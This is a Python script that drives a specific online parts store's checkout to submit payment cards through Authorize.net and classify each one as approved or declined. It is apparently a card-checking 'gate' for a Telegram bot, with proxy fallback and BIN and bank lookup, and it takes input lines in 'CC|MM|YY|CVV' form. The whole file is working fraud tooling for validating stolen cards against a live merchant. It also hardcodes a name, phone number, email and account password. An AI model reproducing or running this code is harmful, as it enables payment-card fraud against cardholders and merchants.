# ============================================================
#  Authorize.net Gate — ported 1:1 from Authorize.net.svb
#  Site: compressedairpartscompany.com
#  Flow: Add to cart → Checkout → Billing → Shipping → Pay
# ============================================================

import re
import time
import random
import logging
import requests
from urllib.parse import quote

logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

SITE_URL = "https://compressedairpartscompany.com"
PRODUCT_URL = f"{SITE_URL}/00521-007spreplacementsullivanpalatekairfilter.aspx"
CHECKOUT_URL = f"{SITE_URL}/checkout.aspx"

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"

COMMON_HEADERS = {
    "User-Agent": UA,
    "Pragma": "no-cache",
    "Accept": "*/*",
}


def _lr(source, left, right):
    """Left-Right parse — exact SilverBullet LR behavior."""
    try:
        start = source.index(left) + len(left)
        end = source.index(right, start)
        return source[start:end]
    except (ValueError, AttributeError):
        return None


def _get_card_type(first_digit):
    """Map first digit to Authorize.net card type value (from SVB Translate block)."""
    mapping = {"4": "2", "5": "1", "3": "3", "6": "4"}  # Visa=2, MC=1, Amex=3, Discover=4
    return mapping.get(first_digit, "2")


def _get_bin_info(bin6):
    default = {
        "brand": "UNKNOWN", "type": "UNKNOWN", "level": "UNKNOWN",
        "bank": "UNKNOWN", "country": "UNKNOWN", "emoji": "🏳️",
    }
    try:
        r = requests.get(f"https://api.voidex.dev/api/bin?bin={bin6}", timeout=8)
        if r.status_code == 200:
            d = r.json()
            if d and "brand" in d:
                return {
                    "brand": d.get("brand", "UNKNOWN"),
                    "type": d.get("type", "UNKNOWN"),
                    "level": d.get("brand", "UNKNOWN"),
                    "bank": d.get("bank", "UNKNOWN"),
                    "country": d.get("country_name", "UNKNOWN"),
                    "emoji": d.get("country_flag", "🏳️"),
                }
    except Exception:
        pass
    return default


def _process_card(cc, mm, yy, cvv, proxy_dict=None):
    """
    Full Authorize.net checkout flow — 1:1 parity with SVB config.
    Steps: GET product → POST add-to-cart → GET checkout →
           POST billing → POST shipping → POST payment
    """
    # SVB: KEYCHECK — year must be 4 digits
    if len(yy) != 4:
        return {"status": "Error", "response": "Year must be 4 digits (e.g. 2027)"}

    card_type = _get_card_type(cc[0])

    session = requests.Session()

    def _req(method, url, **kwargs):
        """Request with proxy fallback."""
        kwargs.setdefault("headers", COMMON_HEADERS)
        kwargs.setdefault("timeout", 25)
        try:
            return session.request(method, url, proxies=proxy_dict, **kwargs)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            if proxy_dict:
                return session.request(method, url, **kwargs)
            raise

    try:
        # ── Step 1: GET product page ────────────────────────
        resp = _req("GET", PRODUCT_URL)
        if resp.status_code != 200:
            return {"status": "Error", "response": f"Product page HTTP {resp.status_code}"}

        page_text = resp.text

        vs = _lr(page_text, 'name="__VIEWSTATE" id="__VIEWSTATE" value="', '"')
        ev = _lr(page_text, 'name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"')
        gen = _lr(page_text, 'name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"')

        if not vs or not ev or not gen:
            return {"status": "Error", "response": "Failed to extract ViewState from product page"}

        # Extract product ID dynamically
        pid_match = re.search(r'productDetailsID["\s>]*?value="(\d+)"', page_text)
        if not pid_match:
            pid_match = re.search(r'productDetailsID["\s]*>(\d+)<', page_text)
        product_id = pid_match.group(1) if pid_match else "55965"

        # ── Step 2: POST add to cart ────────────────────────
        add_data = (
            f"__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE={quote(vs)}"
            f"&__VIEWSTATEGENERATOR={quote(gen)}&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=101"
            f"&__EVENTVALIDATION={quote(ev)}"
            f"&ctl00%24ctl05%24search=&ctl00%24ctl07%24txtSearch="
            f"&ctl00%24ctl08%24manufacturers=Select+..."
            f"&ctl00%24pageContent%24productDetailsID={product_id}"
            f"&ctl00%24pageContent%24txtQuantity=1"
            f"&ctl00%24pageContent%24addToCart.x=62"
            f"&ctl00%24pageContent%24addToCart.y=14"
            f"&ctl00%24ctl19%24mailingList%24txtEmail="
            f"&ctl00%24ctl20%24lvDisplay%24txtUsername="
            f"&ctl00%24ctl20%24lvDisplay%24txtPassword="
        )
        post_headers = {**COMMON_HEADERS, "Content-Type": "application/x-www-form-urlencoded"}
        _req("POST", PRODUCT_URL, headers=post_headers, data=add_data)

        # ── Step 3: GET checkout page ───────────────────────
        resp = _req("GET", CHECKOUT_URL)
        if resp.status_code != 200:
            return {"status": "Error", "response": f"Checkout page HTTP {resp.status_code}"}

        vs2 = _lr(resp.text, 'name="__VIEWSTATE" id="__VIEWSTATE" value="', '"')
        ev2 = _lr(resp.text, 'name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"')
        gen2 = _lr(resp.text, 'name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"')

        if not vs2 or not ev2 or not gen2:
            return {"status": "Error", "response": "Failed to extract ViewState from checkout"}

        # ── Step 4: POST billing info ───────────────────────
        billing_data = (
            f"ctl00%24ctl05%24search=10080"
            f"&ctl00%24ctl07%24txtSearch=10080"
            f"&ctl00%24ctl08%24manufacturers=Select+..."
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtFirstName=Said"
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtLastName=Hesham"
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtCompanyName="
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24ddlCountry=US"
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtAddress1=NY"
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtAddress2="
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtZipPostal=10080"
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtCity=NY"
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24usStates=NY"
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtPhoneNumber=2015385217"
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24chkBillingSameAsShipping=on"
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtFirstName=Said"
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtLastName=Hesham"
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtCompanyName="
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24ddlCountry=US"
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtAddress1=NY"
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtAddress2="
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtZipPostal="
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtCity="
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24usStates=NY"
            f"&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtPhoneNumber="
            f"&ctl00%24pageContent%24checkoutWizard%24emailForm%24txtEmail=saidhesham.tst%40gmail.com"
            f"&ctl00%24pageContent%24checkoutWizard%24emailForm%24txtConfirmEmail=saidhesham.tst%40gmail.com"
            f"&ctl00%24pageContent%24checkoutWizard%24StartNavigationTemplateContainerID%24btnNext.x=29"
            f"&ctl00%24pageContent%24checkoutWizard%24StartNavigationTemplateContainerID%24btnNext.y=3"
            f"&ctl00%24ctl19%24mailingList%24txtEmail=saidhesham.tst%40gmail.com"
            f"&ctl00%24ctl20%24lvDisplay%24txtUsername=saidhesham.tst%40gmail.com"
            f"&ctl00%24ctl20%24lvDisplay%24txtPassword=Said"
            f"&__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS="
            f"&__VIEWSTATE={quote(vs2)}"
            f"&__VIEWSTATEGENERATOR={quote(gen2)}"
            f"&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=800"
            f"&__PREVIOUSPAGE=q4-3ILS-E9QK3-KnCyeSxjXobh7WXzw4S9-gdMTm6SqjrL_HH-dfzZj5Eke66_DmQzjVSvUpDyKW27y_JqaEWQ2"
            f"&__EVENTVALIDATION={quote(ev2)}"
            f"&__VIEWSTATEENCRYPTED="
        )
        resp = _req("POST", f"{CHECKOUT_URL}?step-2", headers=post_headers, data=billing_data)

        vs3 = _lr(resp.text, 'name="__VIEWSTATE" id="__VIEWSTATE" value="', '"')
        ev3 = _lr(resp.text, 'name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"')
        gen3 = _lr(resp.text, 'name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"')

        if not vs3 or not ev3 or not gen3:
            return {"status": "Error", "response": "Failed to extract ViewState from billing step"}

        # ── Step 5: POST shipping ───────────────────────────
        shipping_data = (
            f"__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS="
            f"&__VIEWSTATE={quote(vs3)}"
            f"&_VIEWSTATEGENERATOR={quote(gen3)}"
            f"&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=500"
            f"&__VIEWSTATEENCRYPTED="
            f"&__PREVIOUSPAGE=q4-3ILS-E9QK3-KnCyeSxjXobh7WXzw4S9-gdMTm6SqjrL_HH-dfzZj5Eke66_DmQzjVSvUpDyKW27y_JqaEWQ2"
            f"&__EVENTVALIDATION={quote(ev3)}"
            f"&ctl00%24ctl05%24search=10080"
            f"&ctl00%24ctl07%24txtSearch=10080"
            f"&ctl00%24ctl08%24manufacturers=Select+..."
            f"&ShippingOptions=ctl00%24pageContent%24checkoutWizard%24shippingMethods%24FDX%24rate0"
            f"&ctl00%24pageContent%24checkoutWizard%24StepNavigationTemplateContainerID%24btnNext.x=35"
            f"&ctl00%24pageContent%24checkoutWizard%24StepNavigationTemplateContainerID%24btnNext.y=8"
            f"&ctl00%24ctl19%24mailingList%24txtEmail=saidhesham.tst%40gmail.com"
            f"&ctl00%24ctl20%24lvDisplay%24txtUsername=saidhesham.tst%40gmail.com"
            f"&ctl00%24ctl20%24lvDisplay%24txtPassword="
        )
        resp = _req("POST", f"{CHECKOUT_URL}?step-3", headers=post_headers, data=shipping_data)

        vs4 = _lr(resp.text, 'name="__VIEWSTATE" id="__VIEWSTATE" value="', '"')
        ev4 = _lr(resp.text, 'name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"')
        gen4 = _lr(resp.text, 'name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"')

        if not vs4 or not ev4 or not gen4:
            return {"status": "Error", "response": "Failed to extract ViewState from shipping step"}

        # ── Step 6: POST payment (final checkout) ───────────
        checkout_data = (
            f"__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS="
            f"&__VIEWSTATE={quote(vs4)}"
            f"&__VIEWSTATEGENERATOR={quote(gen4)}"
            f"&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=600"
            f"&__VIEWSTATEENCRYPTED="
            f"&__PREVIOUSPAGE=q4-3ILS-E9QK3-KnCyeSxjXobh7WXzw4S9-gdMTm6SqjrL_HH-dfzZj5Eke66_DmQzjVSvUpDyKW27y_JqaEWQ2"
            f"&__EVENTVALIDATION={quote(ev4)}"
            f"&ctl00%24ctl05%24search=10080"
            f"&ctl00%24ctl07%24txtSearch=10080"
            f"&ctl00%24ctl08%24manufacturers=Select+..."
            f"&ctl00%24pageContent%24hdnActiveStep=wzsReviewAndPayment"
            f"&ctl00%24pageContent%24hdnBtnFinish=ctl00_pageContent_checkoutWizard_FinishNavigationTemplateContainerID_btnNext"
            f"&ctl00%24pageContent%24checkoutWizard%24orderInvoiceReview%24txtOrderNotes="
            f"&ctl00%24pageContent%24checkoutWizard%24payments%24paymentMethodSelector=auth-net"
            f"&ctl00%24pageContent%24checkoutWizard%24payments%24authnet%24fields%24ccfname%24value=Said"
            f"&ctl00%24pageContent%24checkoutWizard%24payments%24authnet%24fields%24cclname%24value=Hesham"
            f"&ctl00%24pageContent%24checkoutWizard%24payments%24authnet%24fields%24ccnumber%24value={cc}"
            f"&ctl00%24pageContent%24checkoutWizard%24payments%24authnet%24fields%24cctype%24value={card_type}"
            f"&ctl00%24pageContent%24checkoutWizard%24payments%24authnet%24fields%24ccexpiration%24month={mm}"
            f"&ctl00%24pageContent%24checkoutWizard%24payments%24authnet%24fields%24ccexpiration%24year={yy}"
            f"&ctl00%24pageContent%24checkoutWizard%24payments%24authnet%24fields%24cccvv%24value={cvv}"
            f"&ctl00%24pageContent%24checkoutWizard%24FinishNavigationTemplateContainerID%24btnNext.x=65"
            f"&ctl00%24pageContent%24checkoutWizard%24FinishNavigationTemplateContainerID%24btnNext.y=1"
            f"&ctl00%24ctl19%24mailingList%24txtEmail=saidhesham.tst%40gmail.com"
            f"&ctl00%24ctl20%24lvDisplay%24txtUsername=saidhesham.tst%40gmail.com"
            f"&ctl00%24ctl20%24lvDisplay%24txtPassword="
        )
        resp = _req("POST", f"{CHECKOUT_URL}?complete", headers=post_headers, data=checkout_data)

        # ── Step 7: Parse result (SVB: #MSG LR) ────────────
        msg = _lr(resp.text, '<div class="notification text-error">', '<br')

        if msg:
            msg = msg.strip()
            msg_lower = msg.lower()
            # Determine status from response
            if any(kw in msg_lower for kw in ("approved", "success", "thank you", "order has been placed", "order confirmed")):
                return {"status": "Approved", "response": msg}
            else:
                return {"status": "Declined", "response": msg}
        else:
            # No error div — check for success indicators
            if "order confirmation" in resp.text.lower() or "thank you" in resp.text.lower() or "order has been placed" in resp.text.lower():
                return {"status": "Approved", "response": "Order Placed Successfully"}
            # Check for other error patterns
            error_div = _lr(resp.text, 'class="notification', '</div>')
            if error_div:
                clean = re.sub(r'<[^>]+>', '', error_div).strip()
                if clean:
                    return {"status": "Declined", "response": clean}
            return {"status": "Declined", "response": "Unknown response"}

    except Exception as e:
        return {"status": "Error", "response": str(e)[:100]}


def check_card(cc_line, proxy_dict=None):
    """
    Entry point for tg_bot gate.
    cc_line: "CC|MM|YY|CVV"
    Returns formatted result string.
    """
    start = time.time()

    parts = cc_line.strip().split("|")
    if len(parts) != 4:
        return "Error | Invalid format (need CC|MM|YY|CVV)"

    cc, mm, yy, cvv = parts

    # Normalize year to 4 digits
    if len(yy) == 2:
        yy = f"20{yy}"

    # Pad month
    if len(mm) == 1:
        mm = f"0{mm}"

    result = _process_card(cc, mm, yy, cvv, proxy_dict)
    elapsed = time.time() - start

    status = result.get("status", "Error")
    response = result.get("response", "Unknown")

    bin_info = _get_bin_info(cc[:6])

    if status == "Approved":
        return (
            f"Approved | {response}\n"
            f"Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"Gateway: Authorize.net\n"
            f"BIN: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}\n"
            f"Bank: {bin_info['bank']}\n"
            f"Country: {bin_info['country']} {bin_info['emoji']}\n"
            f"Time: {elapsed:.1f}s"
        )
    elif status == "Declined":
        return (
            f"Declined | {response}\n"
            f"Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"Gateway: Authorize.net\n"
            f"BIN: {bin_info['brand']} - {bin_info['type']}\n"
            f"Time: {elapsed:.1f}s"
        )
    else:
        return f"Error | {response}"


def probe_site():
    """Health check — can we reach the product page?"""
    try:
        r = requests.get(PRODUCT_URL, headers=COMMON_HEADERS, timeout=10, allow_redirects=True)
        alive = r.status_code == 200 and "addToCart" in r.text
        return alive, f"HTTP {r.status_code}" + (" | Product page OK" if alive else " | No add-to-cart found")
    except Exception as e:
        return False, str(e)[:60]
